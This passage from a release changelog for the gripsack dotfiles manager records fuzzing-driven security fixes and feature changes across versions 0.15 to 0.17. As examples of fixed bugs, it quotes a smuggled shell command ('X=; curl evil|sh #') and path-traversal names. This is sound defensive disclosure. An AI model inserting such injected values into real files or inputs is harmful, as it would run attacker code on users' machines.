  any owned destination that still pointed into the repo, with an
  error naming the module instead of the link. An `owned` destination
  that is itself a symlink into the repo is now treated as prior
  state: the normal owned drift guard answers (use `--take-over` to
  replace; the original target is captured as a prior and never
  touched). Write-through modes still refuse — writing would land in
  the checkout — but the error now names the mechanism and the way
  out.
- **`grip update` silently dropped modules outside the host's
  graph.** A probe-gated (or typo'd) name in `grip update a b c`
  vanished — eight asked, seven answered, exit 0. Out-of-graph names
  now report `skipped (not in this host's graph)`; `grip apply`
  refuses them outright.
- **The pinned Deno runtime is now the default.** Resolution used to
  prefer a deno on PATH over the pinned, sha256-verified download —
  two "identical" machines could evaluate through different runtimes
  because one happened to have deno installed. Precedence is now
  `GRIPSACK_DENO` → pinned → PATH (≥ 2, with a run-log warning) only
  when the pinned one is unavailable (musl host, failed download).
  `grip doctor` labels which one answered. Site-managed denos: set
  `GRIPSACK_DENO`.
- **`apply` no longer reports failure after activating.** The
  exported-env profile (`env/profile.sh`) rendered after the
  generation flip; an I/O error there said apply-failed while the
  new generation was already active. It renders before the flip — a
  failure now leaves nothing activated.
- W10's tuicr coverage message says `0.2.x`, not `0.2x` (the latter
  reads as covering anything starting `0.2`).

### Notes

- `update` records `sha256`; `tree256` (the extracted tree's hash)
  is necessarily recorded at the first `apply` on that host — it
  cannot be known before extraction. Split-resolution setups (one
  host resolves, another applies) will see the apply add the field.
- Stranded on ≤ 0.17.9 behind shared egress where `self-update`
  cannot reach the API? Fetch the release tarball directly — the
  same egress allows it:
  `curl -LO https://github.com/gripsack-dev/gripsack/releases/latest/download/gripsack-<version>-<target>.tar.gz`
  (this is also how the 0.17.10+ self-update fix can be reached).


## [0.17.13] — 2026-09-02

Round two: a fresh fuzzing campaign (5,200+ IR mutations, 2,700 argv
runs, eval/store/adopt/tar campaigns), a code-quality review, and
the refactors it justified. No IR schema change.

### Fixed

- **merge blocks could silently corrupt the file they manage.** Block
  detection matched the close marker by substring, so a payload line
  that merely quoted `<<< gripsack <<<` read as the end of the
  block: rollback left the block behind (sometimes with a false
  "modified since deploy" warning), prune appended strays, and every
  re-apply grew the file by another line — unbounded, all rc=0.
  Close markers now carry the module name, marker lines must BE
  marker lines (a quoted marker in content no longer matches), and
  payload lines quoting the banner text no longer fall out of the
  block hash. Existing blocks are found and rewritten with scoped
  markers on the next apply.
- **`grip adopt` on a fifo hung forever** (it "adopted" the fifo,
  then blocked reading it). Special files are refused at inventory
  and at copy: "not a regular file".
- **`fileFetch` on a fifo or a symlink to `/dev/zero` hung the
  read** with no bound. The file fetcher and the canonical hasher
  now refuse non-regular files; symlinked payloads still work.
- **`grip update` could pick a different lockfile than `grip
  apply`.** It re-derived the host from `$HOSTNAME` — a bash-ism
  POSIX sh does not export — ignoring env.toml's `default_host`.
  The evaluated host now travels with the eval outcome and every
  command reuses it.
- **A module whose content was only a build/run step published an
  empty store path.** Publish staged a fresh directory and wiped
  what the step had just produced — apply "succeeded" with the
  artifact gone. Step staging persists now (e2e regression added).
- **The trust gate could erase concurrent trust decisions** (the
  prompt window rewrote the whole file from a pre-prompt snapshot)
  and printed repo paths raw — a path carrying newlines or ANSI
  escapes could forge prompt lines. Trust mutations serialize on a
  flock; prompt values with control characters print escaped.
- A malicious plugin release tag (`a/../../evil`) could walk out of
  the plugin store; tags must be a safe single path segment now.
  `git:` revs are validated before they reach
  `git fetch` (option injection). The throttle's host parser is
  IPv6-literal-aware and shared with the HTTP layer (one URL
  grammar, not two). Downloaded throttle state and plugin receipts
  write through the store's atomic primitives. pixi provisioning
  takes the same flock deno does, and its staging path no longer
  collides across patch releases.
- `grip gc` printed "0.0 B freed" on color terminals but omitted a
  real number when piped; `dir_size` no longer follows symlink
  cycles (a hostile tarball could stack-overflow it); `grip update`
  colors follow the terminal like every other command; empty
  `GRIPSACK_HOME`/`XDG_DATA_HOME` no longer produce CWD-relative
  store paths; a missing generation dir is a loud flip error, not a
  `current` symlink pointing at nothing.

### Changed

- Colors follow the terminal everywhere: the remaining unguarded
  ANSI sites (trust, why-owns, doctor, plan, rollback, init, adopt,
  check, store-verify) route through the palette; piped output is
  plain by construction, not per-call-site discipline.
- Internals, no behavior change: `eval` split into its stages
  (`probe::eval_to_fixpoint`, `frontend::Frontend`,
  `provision_plugins`), the validate pipeline is one function
  (`validated_ir`) shared by check/apply, `apply` takes an options
  struct instead of seven positional arguments, `expand_home` and
  the flock primitive live in gripsack-store (one implementation
  each instead of two/three), and the CLI/exec `render.rs` name
  collision is gone (exec's is `template.rs` — it renders file
  content, not consoles). Lower crates never print: one stray
  eprintln became a run-log warning.


## [0.17.12] — 2026-09-01

A hardening pass: a fuzzing campaign over every CLI flow (IR
mutation, argv, env-repo eval, store/generation corruption) plus a
full audit of all nine crates. New diagnostics E116 (module names)
and E117 (env var names); no IR schema change.

### Fixed

- **`grip store verify --repair` could delete any directory on
  disk.** The manifest's `store_path` was trusted as the delete
  target — a tampered manifest naming, say, `~/project` turned
  `--repair` into `rm -rf` of it. Repair now refuses anything
  outside `$GRIPSACK_HOME/store`, and store-verify takes the apply
  lifecycle lock so it cannot race an in-flight apply.
- **Malformed lockfiles crashed `apply` (panic, exit 101).** A short
  `tree256` pin sliced past its end at store-path construction. Pins
  are validated (64-hex) when the lock is read, and a corrupt lock is
  now a loud error on both `apply` and `update` — never a silent
  reset to "no lock", which used to make `update` rewrite the whole
  file and erase every other module's pin.
- **`store verify` panicked on short manifest hashes** (exit 101);
  tampered manifests now report cleanly, and unreadable generation
  manifests surface as warnings instead of reading as "ok".
- **merge mode into a non-text destination destroyed the file.** A
  binary (or unreadable) dest was read as empty and the managed
  block REPLACED the entire foreign file — 1 KiB of binary became
  128 bytes of markers, silently. Deploy refuses loudly now, and
  rollback leaves such files alone.
- **A failed apply after `--take-over` lost your original file.**
  The run-level rollback removed the deployed symlink but never
  restored the captured prior — the original bytes existed only in
  the prior blob store. Priors are restored first on rollback.
- **Env var names reached `profile.sh` unquoted.** A name like
  `X=; curl evil|sh #` landed raw in a file your shell sources
  (values were quoted; names could not be). E117 rejects non-shell-
  identifier names at eval, and the profile renderer skips them in
  hand-edited manifests.
- **Module names flowed into store path segments unvalidated.** A
  name like `x/../../pwned` walked out of the store directory. E116
  restricts names to letters, digits, `_`, `-`, `.` (no separators,
  no `:`, no leading `.`).
- **The GitHub enterprise token leaked to third-party hosts.**
  `GH_ENTERPRISE_TOKEN` was attached to every request that was not
  github.com — any module tarball URL received the credential. It
  now binds only to the host `GH_HOST`/`GITHUB_HOST` names (the gh
  CLI convention) and attaches nowhere when unset.
- **Downloads that hit the 512 MiB cap were silently truncated and
  extracted.** Hitting the cap is an error now, and xz/gz
  decompression is capped so a compressed bomb cannot balloon in
  RAM before the traversal scan runs.
- **Stuck linters/plugins hung grip forever.** The NDJSON exchanges
  enforced deadlines only between reads: a child that went silent
  (or answered but never exited) blocked forever, a >64 KiB request
  could deadlock both sides, and an endless line could OOM. Deadlines
  are enforced end-to-end (kill + reap), lines cap at 1 MiB, stdin
  is written on a writer thread, and unknown linter severities no
  longer coerce to Error.
- **`steps: [...]` modules bypassed the destination rules.** E102
  (absolute/`~/` destinations) and E111 (duplicate destination)
  walked only the declarative install/config fields; entries inside
  step actions got neither check.
- **Lint engine correctness.** W10 version coverage compares
  numerically instead of by string prefix ("0.14" no longer covers
  "0.140"); unknown `[[array-of-tables]]` sections now get A02;
  JSON/YAML `null` reports "got null" instead of "got string"; `1`
  matches a `1.0` choice; indented multi-char keys report real
  columns; TOML error spans stay accurate past multibyte characters.
- `grip update` colored its output even when piped or `NO_COLOR`
  was set; apply writes lockfile pins as soon as fetches land (the
  "already satisfied" early-return used to skip the write); apply
  reads the previous manifest once instead of three times.

## [0.17.11] — 2026-08-31

### Fixed

- **`grip adopt` on a fresh `grip init` repo generated a host file
  that didn't eval.** The host updater matched the `modules: [`
  example inside the template's header comment and inserted the new
  module entry there; the dangling comma swallowed the import below
  ("Import is not allowed here") and adopt's self-check refused its
  own output. The updater targets the real array now, with a
  regression test against the shipped template.
- The demo tapes run again: fixtures moved off the retired Python
  frontend, the rollback tape passes `--host`, and the demo workflow
  extracts the release tarball before installing it. Demos now
  re-render on every CLI change (path triggers on), including the new
  adopt demo.

## [0.17.10] — 2026-08-31

Regression fixes for 0.17.9, from the same migration report.

### Fixed

- **`git()` fetches are deterministic.** The payload hash covered the
  whole clone including `.git` — whose index caches working-tree
  mtimes — so the same rev hashed differently on every fetch and
  every cold-store apply failed its pin check. The checkout alone is
  the payload now; `.git` never reaches the store.
- **A failed apply no longer leaves placeholder-literal links.** The
  generation manifest recorded the RAW install key, so the mid-graph
  rollback restored destinations to paths like
  `ripgrep-{version}-{target}/rg`. The manifest records the expanded
  key, deploy refuses a key that still contains a placeholder after
  expansion (invariant violation, not a path), and restore never
  writes a dangling symlink.
- **`grip self-update` works on shared egress.** The unauthenticated
  GitHub API rate-limits by source IP; when it fails, self-update
  falls back to the web tier (`releases.atom` → plain download URLs)
  — the same path plain release downloads already take.

## [0.17.9] — 2026-08-31

Hardening from a real two-host migration report.

### Fixed

- **A fetched apply no longer drops pin metadata from the lockfile.**
  Re-fetching against a locked pin rewrote the entry with only the
  content hash, losing `version`, `url`, and `api_url` — the next
  warm-store deploy then failed with an unexpanded `{version}` in
  install keys, and a cold store had to re-resolve through the
  registry API (breaking private GitHub Enterprise mirrors behind
  shared egress).
- **Store publish falls back to a copy across filesystems.** Staging
  lives in `$TMPDIR`; on containers that's routinely a tmpfs while
  the store sits on the overlay, and the hard rename died with a bare
  `Cross-device link`. Publish now copies when rename returns EXDEV,
  and store io errors name both paths.
- **Deploy refuses destinations that resolve inside the env repo.** A
  symlinked destination directory (e.g. a leftover from another
  provisioner) used to land the write inside the checkout — the
  module overwrote its own source.
- **A config tree that gains a file re-pins instead of going stale.**
  The lockfile records the repo overlay hash (`repo256`) alongside
  the tree hash: presence checks compare it, `grip update` reports
  the move as a bump, and deploy no longer falls back to linking the
  repo checkout for sources the store never published (0014 §4).
- **`grip update` resolve errors name the module**, not the registry
  string; pinned git modules report `skipped (pinned by rev)` instead
  of "resolution not supported yet".
- **helix linter pack** knows `[editor.inline-diagnostics]` (24.07+).

### Added

- Probe docs say to gate on a stable system path, never the tool's
  own installed presence (which oscillates).

## [0.17.8] — 2026-08-30

Dead-IR audit: nothing in the schema may exist without an executor.

### Added

- **`run` steps are executable** (0007 §3's middle rung): structured
  argv/env/cwd as data, no shell interpretation, declared outputs
  checked after the run. Previously declared-but-refused — the
  phantom-class the cargo_install removal started.
- **`{arch.x64}` placeholder** (node-style: x64 / arm64) for upstreams
  whose assets use the node naming family.
- Step-form intents execute through the activation adapters — the
  adapters now read the expanded steps (the single source of truth),
  so declarative `activate` fields and class-style intents take the
  same path, exactly once.

## [0.17.7] — 2026-08-30

### Removed

- **`cargo_install` and `make` build kinds** — declared but never
  executable, which is a phantom contract (valid IR the core refuses
  at apply). The IR now carries only what it executes: `custom_shell`
  plus an ephemeral toolchain module covers the same ground;
  `cargo install --locked` in a custom step with declared outputs is
  the documented rust-build form. Reusable build logic belongs to
  builder plugins when reality demands it (0001 §3.1 amended).

## [0.17.6] — 2026-08-30

### Added

- **npm dependencies in env repos**: module code can import packages
  from the repo's own `package.json` + `node_modules` (BYONM) —
  installed by you, evaluated read-only under the same sandbox as
  module code (no env, no network, no subprocesses, no filesystem
  outside the repo). A dependency needing an effect fails loudly at
  eval; that effect belongs in a probe or a fetcher.
- **`grip init` scaffolds the IDE story**: `package.json` (with
  `@gripsack/core` pinned to a compatible major.minor — types for your
  editor and the deliberate pin), `tsconfig.json`, `node_modules/` in
  `.gitignore`, and a fresh `git init`, cargo-init style.

### Fixed

- The eval spawn applies the pin map via `--import-map` instead of
  relying on deno.json discovery — a discovered deno.json project
  would have blocked BYONM forever (and the embedded frontend now
  carries its `package.json`, which is what flips BYONM on).

## [0.17.5] — 2026-08-30

### Fixed

- E115 path validation now covers explicit-steps modules
  (`installStep`/`configStep` entries) and verify paths — the
  declarative-only pass could be routed around by `steps = [...]`.

## [0.17.4] — 2026-08-30

The beautiful-errors sweep (0004 §3 pushed through the stack).

### Added

- **E114 — unknown placeholder**: a mistyped `{sytem}` in a fetch,
  install, or verify string now fails `grip check` with a span at the
  module and an edit-distance suggestion ("did you mean '{system}'?"),
  instead of a 404 at fetch time.

### Fixed

- Apply-time failures are coded, span-labeled diagnostics: a fetch or
  build step failing now renders `error[E301]`/`E302` pointing at the
  module line ("raised here"), replacing bare `error:` lines.
- Resolution errors name the gripsack module, not the registry string
  ("step resolve failed in fish", not "in fish-shell/fish-shell").
- Probe diagnostic codes (E112/E113) moved into the central codes
  module — the placeholder code is E114, no collision.

### Added (path validation — 0016 §D4)

- **E115 — path shape**: source and destination paths validate at
  check time with spans — payload-relative sources reject absolute
  forms, `..`/`.`/empty segments, trailing slashes, backslashes;
  destinations reject `..` escapes and bare `~`/`/`. Placeholders
  validate as opaque single-segment atoms (their values are
  single-segment by construction).
- **Tar traversal is a loud error**: hostile entries (absolute paths,
  `..` escapes) fail extraction naming the entry — the tar crate's
  unpack_in skips them silently otherwise, stranding a partial payload
  (zip extraction was already sanitizing).

## [0.17.3] — 2026-08-30

Platform facts, floating git, and a hardened store
([plan 0016](plan/0016-platform-facts-floating-git-readonly-store.md)).

### Added

- **Platform placeholders in fetch specs**: `{system}` (flake-style
  `x86_64-linux`), `{target}` (rust triple, musl on linux), `{arch}`,
  `{arch.go}` (goreleaser `amd64`), `{os}` — expanded by the core from
  the machine's facts in asset patterns, tarball URLs, and install and
  verify keys. One module now serves every platform; per-host locks
  keep every machine honest.
- **Floating git fetcher**: `git(url)` without a rev resolves the
  remote's default-branch HEAD at lock time, pins the sha into the
  lockfile, and `grip update` moves it — the same float-and-pin
  semantics every other fetcher already had. Inline revs still pin.
- **Read-only store payloads**: files publish with write bits dropped
  — an app rewriting an `owned` config through its symlink gets
  EACCES instead of silently corrupting the store. Directories stay
  writable, so repair/gc/rollback are unaffected.
- Linter packs: yazi theme sections ([app], [indicator], [cmp],
  [spot], [icon], [flavor], …), helix `completion-timeout` +
  `[editor.whitespace]` + `[editor.lsp]`, starship `$schema`, atuin
  `[daemon]` keys — all sourced from current upstream docs.

### Fixed

- Linter diagnostics for unknown sub-tables named the section and
  pointed at the right header line (they said "unknown key" at line 1).
- Version-skew warnings (W10) no longer fire on current versions —
  host lockfiles pin tag-style versions (`v18.20.1`) while packs
  carried bare prefixes (`18.`); packs now carry both forms.
- atuin `search.shells` accepts the documented string default (was a
  live false-positive A04).

## [0.17.2] — 2026-08-29

Dogfood fixes — every one of them caught by running gripsack against a
real, full-sized dotfiles env.

### Fixed

- `store verify` no longer false-positives on `merge` and `template`
  modules: the manifest records the *deploy-output* hash (trimmed
  block, rendered bytes), and verify now recomputes exactly that
  instead of comparing the raw store file (which could never match).
- Package harvest copies symlinks **as symlinks** instead of following
  them — a symlink to a directory (conda's `lib/terminfo →
  share/terminfo`) crashed pixi-module fetches with a pathless io
  error. Note: pixi payload identity changes with this fix; a
  `grip update <module>` re-pins deliberately.
- API auth tokens now survive **same-host redirects** — a transferred
  GitHub repo (`owner/x` → `new-owner/x`) previously re-requested
  anonymously into the rate-limited pool and 403'd. Cross-host
  redirects still strip credentials (the no-leak rule stands).
- Fetch/copy io errors carry the offending path instead of a bare
  "the source path is neither a regular file…".

## [0.17.1] — 2026-08-29

The adopt audit ([plan 0015 §7](plan/0015-grip-adopt.md)): ask, don't
guess; say exactly what you wrote.

### Changed

- **`grip adopt` no longer guesses ownership.** The hardcoded
  app-behavior tables are deleted — they presented folk knowledge as
  detection. Adopt now *asks* with the semantics laid out (arrow-key
  select): `owned` (read-only link, repo is the only editor),
  `tracked_copy` (real file, drift kept — the safe default), `merge`
  (one managed block in a shared file). Non-interactive runs take
  `tracked_copy` with a loud note; `--mode` is the preseed.
- Adopt's plan labels destinations it will absorb as
  "will be adopted (prior recorded)" instead of demanding
  `--take-over`.

### Fixed

- Adopt no longer follows directory symlinks inside the adopted tree —
  a link could pull an arbitrary directory tree into your repo. Such
  links (and broken ones) are skipped and reported.
- Adopt refuses paths outside `$HOME` (plan compliance) and refuses to
  overwrite existing `modules/<name>.ts` / `configs/<name>/` — the
  never-clobber rule covers the repo too.
- Eval-failure and abort messages list exactly what was written and
  how to abandon it (the old message claimed the repo was untouched).
- Host-entrypoint edits are a pure, unit-tested function; a
  single-line `modules: [a]` insertion produced `[ab, ]` before.
- Large adoptions (>25MB) warn and name the largest entries.

### Refactored

- `commands/adopt.rs` (500 lines) split into
  `adopt/{mod,inspect,generate,prompt}.rs` — pure functions at the
  edges, side effects named. The ownership menu uses dialoguer.

## [0.17.0] — 2026-08-28

Constrained evaluation ([plan 0013](plan/0013-constrained-evaluation.md)).
Breaking: the Python frontend, bun, and uv are removed.

### Added

- **Sandboxed eval**: the TypeScript frontend runs under a pinned,
  hash-verified Deno (2.9.6) with deny-by-default capabilities — no
  environment variables, no network, no subprocesses, read-only within
  the repo. First eval downloads the runtime once; `GRIPSACK_DENO`
  overrides. Eval platforms: glibc Linux and macOS (Deno ships no musl
  build; `grip doctor` says so plainly there).
- **Injected facts**: os/arch/libc/hostname are detected in the Rust
  core and passed to eval in a JSON inputs document — no more
  frontend-side self-detection.
- **Probes**: `ctx.probe.executable("nvidia-smi")` /
  `ctx.probe.file_exists(...)` are symbolic requests the core binds in
  a two-stage eval (fixpoint-capped, E112 on instability), recorded in
  the run log and summarized in `grip plan`'s host-inputs header.
- **Trust gate**: the first eval of an unfamiliar repo prompts before
  running its code, naming the exact sandbox capabilities. `grip trust
  list/add/remove` manages the store; `GRIPSACK_TRUST_ALL=1` is the CI
  bypass.
- **`defineEnv`**: host entrypoints are functions —
  `export default defineEnv((ctx) => ({ tags, modules }) )`. `module()`
  is a pure constructor; falsy module entries drop out. Side-effect
  registration is gone.
- The dual-frontend parity corpus is replaced by a golden IR snapshot
  corpus (fixture envs → IR, byte-exact modulo spans).
- **Content-addressed store identity** ([plan 0014](plan/0014-content-addressed-fetches.md)):
  fetch-only and config-only modules name their store path by the
  canonical hash of their content; builds stay input-addressed (their
  output can't be named before it exists — plan-time naming is what
  keeps `grip plan` complete). A mirror swap or URL edit with identical
  bytes re-proves once, then dedups to the same path: no store churn,
  no new generation. Editing an install mapping no longer refetches.
  The lockfile records both hashes: `sha256` (transport integrity of
  the download) and `tree256` (store identity).
- **`grip store verify` is now correct and host-independent**: the
  whole-tree check previously compared a tree hash against the
  transport hash (could never match) under a hostname-keyed lock
  lookup (usually skipped) — the generation manifest now carries
  `tree256`, and a tampered fetched payload fails verify anywhere.
- **`grip adopt <path>`** ([plan 0015](plan/0015-grip-adopt.md)) — the
  adoption flow as a first-class command: inspects the path,
  recommends an ownership mode with the reason stated, generates the
  payload + module + host entry, shows the plan, and touches nothing
  until confirmed. The apply uses **scoped take-over** (absorbs
  exactly the adopted destinations; unrelated drift is never
  clobbered) and records **prior state** for every taken-over
  destination. Rollback — and undeclaring the module — restores your
  original files, bytes and permission bits, drift-guarded against
  your post-adopt edits. On a fresh machine, adopt records an empty
  **generation 0** first, so adoption is always reversible.
- Prior blobs live content-addressed under `$GRIPSACK_HOME/prior/`;
  `gc` collects them with the same reachability rule as store paths.
- Provisioning is serialized across concurrent `grip` runs — two
  racing applies could corrupt each other's Deno download or embedded
  frontend materialization (os error 26/2 under concurrency).
- Symlink deploys report "unchanged" when the link already points at
  the right store path — a re-proved fetch no longer looks like a
  redeploy.

  Migration note: content-addressed paths differ in shape, so the
  first apply after upgrading re-stages fetch/config modules once
  (identical bytes, new names); `grip gc` collects the old paths.

### Removed

- The Python frontend (`pip install gripsack`), the embedded
  zero-provisioning path, `GRIPSACK_PYTHON`, `[eval] deps`, and uv
  provisioning. `frontend = "python"` in env.toml is an E400 with a
  migration hint.
- bun provisioning and `GRIPSACK_BUN`.

## [0.16.4] — 2026-08-28

### Fixed

- `grip self-update` finds the binary inside the real release layout
  (`gripsack-<version>-<triple>/grip`, not a bare root) — 0.16.3's
  self-update reported "no grip binary" against actual releases; the
  e2e fixture now nests identically so the gate catches the shape.
  (0.16.3 self-updaters: run `curl -fsSL https://gripsack.dev/install.sh | sh` once.)

## [0.16.3] — 2026-08-28

### Added

- **`grip self-update`** — a package manager that can update itself.
  Tarball/install.sh installs fetch the newest `core-v` release, verify
  the mandatory sha256 sidecar, and atomically swap the running binary
  (takes effect next launch). brew/cargo/mise installs get their
  manager's command instead. `--check` reports only.
- This changelog, mirrored at
  [gripsack.dev/docs/changelog](https://gripsack.dev/docs/changelog.html).

## [0.16.2] — 2026-08-28

### Added

- **Zero-provisioning bootstrap**: the Python frontend is embedded in
  the binary. A config-only repo applies with zero network and zero
  provisioning, first apply included — `grip` + any `python3` is the
  whole requirement. Repos declaring `[eval] deps` or wheel linters
  still provision a pinned venv on demand.

### Fixed

- Repo-ref linters (`owner/repo@tag`) no longer force frontend
  provisioning; they resolve from the plugin store, not pip.
- `grip doctor` recognizes the embedded frontend.
- The crates.io publish loop publishes `griplint` before
  `gripsack-lint` (retries absorb index lag, not ordering).

## [0.16.1] — 2026-08-27

### Added

- **`grip store verify [--repair]`** — re-hashes every deployed entry
  against the manifest and every store payload against the lockfile's
  pins; `--repair` removes corrupt paths so the next apply re-fetches.
- The dual-frontend golden corpus: one full-surface fixture env
  evaluated through both frontends, IR diffed modulo spans — running in
  the required CI gate.

### Fixed

- Four parity bugs the corpus caught on debut: TypeScript dropped
  `brew(version=)`, env contributions were missing from the TS spec,
  host arch drifted (`x64` vs `x86_64`), and a missing `--host` file
  silently yielded empty tags instead of erroring. A fifth (musl libc
  detection) fell to the docker gate.
- Rollback of template/merge entries restores rendered bytes from the
  manifest's recorded vars; a foreign file's non-managed content
  survives.
- `keep_generations` resolves from the repo, never cwd-sniffing.

## [0.16.0] — 2026-08-27

### Added

- One deploy engine for apply and rollback: destinations are restored
  through the same code path either way.
- `grip plan` diffs against the live generation — modified, pruned, and
  take-over rows, not just the new manifest.

### Fixed

- Identity projection: spans and absolute paths no longer leak into the
  store-path hash, so two machines with identical repos get identical
  paths.
- IR rejects unknown fields; GC fails closed on corrupt manifests;
  `tracked_copy` drift is e2e-pinned.

## [0.15.5] — 2026-08-26

### Added

- Activation adapters: `fonts` (fontconfig cache) and `desktop_entry`
  (desktop database) intents run post-link/post-activate.

## [0.15.0] — 2026-08-25

### Added

- The griplint engine moved in-crate: all 22 config linters run
  in-process from embedded data packs — no venv, no provisioning for
  first-party linters.
- Plugin lifecycle: `package = "owner/repo@tag"` provisions fetcher and
  linter binaries from releases, sha256-verified and receipted.
- TypeScript frontend evaluates through a pinned, provisioned bun.

---

Earlier releases (≤ 0.14.x) predate this file — see
[the release history](https://github.com/gripsack-dev/gripsack/releases).
